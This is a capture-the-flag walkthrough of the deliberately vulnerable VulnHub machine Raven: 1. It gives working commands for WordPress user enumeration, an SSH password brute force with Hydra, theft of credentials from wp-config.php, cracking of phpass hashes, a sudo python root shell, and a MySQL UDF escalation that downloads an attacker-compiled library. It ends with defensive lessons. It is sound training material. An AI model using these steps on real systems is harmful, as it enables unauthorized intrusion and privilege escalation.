# Raven: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Raven: 1 |
| **Difficulty** | Beginner / Intermediate (four flags, two intended root paths) |
| **Author** | William McCann |
| **Released** | 14 August 2018 |
| **VulnHub Entry** | <https://vulnhub.com/entry/raven-1,256/> |
| **Download** | <https://vulnhub.com/entry/raven-1,256/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Debian 8 "jessie" (Apache 2.4.10, WordPress 4.8.x, MySQL 5.5) |

> **Note:** VMware/VirtualBox builds vary ("varies by build") — the WordPress
> version shows as 4.8.7 or 4.8.18 depending on the release, and flag file
> locations can shift. The chain below is the intended one. **There are four
> flags** to collect.

---

## 0. What you will learn

- How to enumerate a web server hosting **WordPress** and **phpMyAdmin**.
- How to enumerate WordPress **usernames** with `wpscan`.
- How to **brute-force SSH** with `hydra` when a user reuses a trivial password.
- How to read **`wp-config.php`** for database credentials and reuse them to log into **MySQL**.
- How to dump `wp_users` and **crack WordPress password hashes** with John the Ripper.
- Two ways to root the box:
  1. **`sudo python`** with no restrictions (a GTFOBins escape), and
  2. a **MySQL UDF** ("User Defined Function") library to run commands **as root**.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali must be on the same host-only/NAT
network as the target. Add `raven.local` to `/etc/hosts`.

---

## 1. Reconnaissance — finding the target

> **Goal:** discover the target IP on the lab subnet (DHCP — confirm every time).

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
   192.168.56.1    0a:00:27:00:00:00      1      60  Cadmus Computer Systems
   192.168.56.101  08:00:27:12:34:56      2     120  PCS Systemtechnik GmbH
```

> **How to read it:** the host that is not the gateway is our target.

**Target IP:** `192.168.56.101`

![Finding the target](images/01-recon.png)

```bash
echo "192.168.56.101 raven.local" | sudo tee -a /etc/hosts
```

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
```

```bash
sudo nmap -sC -sV -p 22,80,111 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Raven Security
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
```

> **How to read it:** `22` SSH and `80` HTTP are the useful ones. `rpcbind` (111)
> is a legacy RPC mapper — the writeups confirm it is not exploitable here, so
> we move on.

![Nmap scan output](images/02-nmap.png)

### 2.2 Web content discovery

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 40
```

```text
/index.html           (Status: 200)
/manual               (Status: 301)
/vendor               (Status: 301)
/wordpress            (Status: 301)   <-- WordPress CMS
/server-status        (Status: 403)
```

Browse `http://raven.local` — it is the "Raven Security" marketing site, and its
**Blog** link points at `/wordpress/`. There we see posts authored by **michael**.

![Web enumeration — finding WordPress](images/03-enum.png)

### 2.3 Enumerate WordPress users

```bash
wpscan --url http://raven.local/wordpress/ -e u --disable-tls-checks
```

```text
[+] WordPress version 4.8.7 identified (Insecure)
[+] Enumerating Users ...
[i] User(s) Identified:
[+] michael
 | Found By: Author Posts - Author Pattern (Passive Detection)
[+] steven
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

> **Why it works:** WordPress exposes author names via `/?author=1`, `/?author=2`,
> etc. `wpscan -e u` loops the IDs and leaks every author: **michael** and **steven**.
> (Browse `http://raven.local/wordpress/?author=1` manually to see the redirect.)

---

## 3. Foothold

### 3.1 SSH brute force (weak password)

The users' names are good candidates, so test "username as password" and a wordlist:

```bash
hydra -l michael -P /usr/share/wordlists/rockyou.txt -e nsr -I ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: michael   password: michael
```

> **Why it works:** `-e nsr` makes Hydra also try the login as an **empty
> password**, the **login name** itself, and the **reversed** login name. Michael
> used his own username as his password. `-I` ignores any old `hydra.restore`
> file so a fresh run starts cleanly.

### 3.2 Log in and grab flag 2

```bash
ssh michael@192.168.56.101
# password: michael
```

```text
michael@Raven:~$
```

```bash
cat /var/www/flag2.txt 2>/dev/null || find / -name "flag2*" 2>/dev/null
```

```text
(flag2 -- located under /var/www)
```

> **Why it matters:** as the low-privilege user we can already read flags left in
> web-accessible directories. That is itself a misconfiguration (world-readable
> flags), but the goal now is to escalate.

![SSH access as michael](images/04-foothold.png)

### The user flag(s)

```bash
find / -name "flag*.txt" 2>/dev/null
cat /var/www/flag2.txt
```

```text
(flag2)
```

![User flag](images/06-user-flag.png)

---

## 4. Privilege escalation

### 4.1 Read the database credentials

```bash
cat /var/www/html/wordpress/wp-config.php
```

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');
```

> **Why it works:** `wp-config.php` holds the WordPress database credentials in
> clear text. The MySQL account is **`root`** with password **`R@v3nSecurity`**.
> Reused credentials like this are a classic escalation pivot.

### 4.2 Dump users, crack a hash

```bash
mysql -u root -p -h 127.0.0.1
```

```text
Enter password: R@v3nSecurity
mysql> show databases;
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
mysql> use wordpress;
mysql> select ID,user_login,user_pass from wp_users;
```

```text
+----+------------+------------------------------------+
| ID | user_login | user_pass                          |
+----+------------+------------------------------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 |
|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ |
+----+------------+------------------------------------+
```

> **Why it works:** WordPress stores **phpass** hashes (`$P$...`). Save steven's
> hash and crack it offline — these designs are slow, and the password is in
> `rockyou.txt`.

```bash
echo '$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```text
pink84
```

![Privesc — cracking the WordPress hash](images/07-privesc.png)

### 4.3 Root path A — `sudo python` (GTFOBins)

```bash
su steven
# password: pink84
sudo -l
```

```text
Matching Defaults entries for steven on raven:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
```

> **Why it works:** steven can run **`/usr/bin/python` as root with no
> password**. Python can spawn an interactive shell, which inherits root's
> privileges. This is a standard **GTFOBins** escape.

```bash
sudo python -c 'import pty; pty.spawn("/bin/bash")'
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cd /root && ls -la
cat /root/flag4.txt
```

```text
CONGRATULATIONS on successfully rooting Raven!
(flag4 -- root flag)
```

> **Why it works:** the spawned shell is a child of a root-owned process, so it
> runs as root. Any interpreter or utility you can `sudo` to without args
> restrictions can be turned into a root shell.

### 4.4 Root path B — MySQL UDF (the "intended" second way)

This path abuses the fact that MySQL runs as **root** and allows loading a
**User Defined Function** shared library. It is more involved than path A, but it
teaches how `sys_eval`/`do_system` UDFs work.

Grab and compile the well-known UDF library `1518.c` (Exploit-DB 1518 / the
`raptor_udf2` family), then serve it from Kali:

```bash
# On Kali
searchsploit -m 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
python3 -m http.server 80
```

```bash
# On the target
cd /tmp
wget http://192.168.56.10/1518.so
chmod +x 1518.so
```

Back in the MySQL shell:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
select do_system('chmod u+s /usr/bin/find');
```

> **Why it works:** MySQL runs as root, so `dumpfile` can write into the plugin
> directory, and `create function` can register a **UDF** that executes shell
> commands. We make `find` setuid-root.

```bash
cd /tmp
touch raj
find raj -exec "whoami" \;
find raj -exec "/bin/sh" \;
```

```text
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
find / -name "flag*.txt" 2>/dev/null
cat /root/flag4.txt
```

```text
CONGRATULATIONS on successfully rooting Raven!
```

![Root flag](images/08-root-flag.png)

### 4.5 Where the other two flags live

- **flag1** — on the website (check the main `index.html` / blog page source).
- **flag2** — under `/var/www` (readable once SSH'd in as michael).
- **flag3 / flag4** — stored inside the **`wp_posts`** table of the `wordpress`
  database (view them with `select post_content from wp_posts;`) and in
  `/root/flag4.txt`. Some writeups note a maintainer accidentally moved flag3
  into flag4 — "varies by build".

```sql
select post_content from wp_posts;
```

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | WordPress user enumeration | `/wordpress/?author=N` | Leaks `michael` and `steven` |
| 2 | Weak password (username = password) | SSH (`michael:michael`) | Initial foothold |
| 3 | Cleartext DB credentials in web root | `/var/www/html/wordpress/wp-config.php` | MySQL `root` access |
| 4 | Reused/weak WordPress password hash | `wp_users` table (`steven`) | Cracked to `pink84` → `su steven` |
| 5 | Unrestricted `sudo python` | `sudo -l` for `steven` | Trivial root via GTFOBins (path A) |
| 6 | MySQL running as root + writable plugin dir | MySQL UDF upload | Root command execution (path B) |
| 7 | Flags stored world-readable / in web root | `/var/www`, web pages, `wp_posts` | Information disclosure |
| 8 | Outdated software | WordPress 4.8.x, Apache 2.4.10, Debian 8 | Known CVEs loosely in scope |

## 6. Defensive lessons (blue team)

- **Enforce strong, unique passwords** and lock out brute-force attempts. A
  username-as-password login should never succeed; add rate limiting and MFA.
- **Never commit secrets to the web root.** `wp-config.php` should not be
  readable by the web user in a way that leaks cleartext DB passwords; use a
  secrets manager and least-privilege DB accounts (not `root`).
- **Run MySQL as a non-root service account** and disable `FILE`/plugin loading
  (`--secure-file-priv`, `--skip-symbolic-links`). This kills the UDF escalation.
- **Restrict `sudo`.** Never grant `(ALL) NOPASSWD:` to interpreters/utilities
  like `python`, `bash`, `find`, `vi`. Use `sudoers` command allow-lists with
  arguments where possible.
- **Harden WordPress:** disable user enumeration (`?author=` redirects), keep
  core/plugins updated, and apply file permissions so the web user cannot read
  or write sensitive config.
- **Don't store flags/secrets world-readable**, and keep them out of any
  document root.
- **Detection ideas:** alert on SSH brute force (many failed logins), on
  `wp-config.php` being read by non-admins, on new files in MySQL's plugin
  directory, and on setuid bits being added to system binaries (`auditd`).

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/raven-1,256/>
- Community writeups consulted:
  - [Hack the Raven: Walkthrough — Hacking Articles](https://www.hackingarticles.in/hack-the-raven-walkthrough-ctf-challenge/)
  - [Raven 1 Vulnhub Walkthrough — Lipson Thomas](https://lipsonthomas.com/raven-1-vulnhub-walkthrough/)
  - [Raven 1 CTF walkthrough — Infosec Institute](https://www.infosecinstitute.com/resources/penetration-testing/raven-1-ctf-walkthrough/)
  - [Raven 1 Walkthrough — Alex's pwnlab](https://amtzespinosa.github.io/posts/raven-1-walkthrough/)
- Vendor advisories / docs:
  - [GTFOBins — python](https://gtfobins.github.io/gtfobins/python/) (sudo escape)
  - [Exploit-DB 1518 — MySQL UDF / `raptor_udf2` local privilege escalation](https://www.exploit-db.com/exploits/1518)
  - [WPScan](https://wpscan.com/)
  - [OWASP: Credential Stuffing / Password Reuse](https://owasp.org/www-community/attacks/Credential_stuffing)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target
- [ ] `images/02-nmap.png` — port/service scan
- [ ] `images/03-enum.png` — the key enumeration finding (`/wordpress`, users)
- [ ] `images/04-foothold.png` — SSH foothold as michael
- [ ] `images/05-shell.png` — the shell
- [ ] `images/06-user-flag.png` — user flag (flag2)
- [ ] `images/07-privesc.png` — the privesc finding (hash crack / `sudo -l`)
- [ ] `images/08-root-flag.png` — root flag (flag4)

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
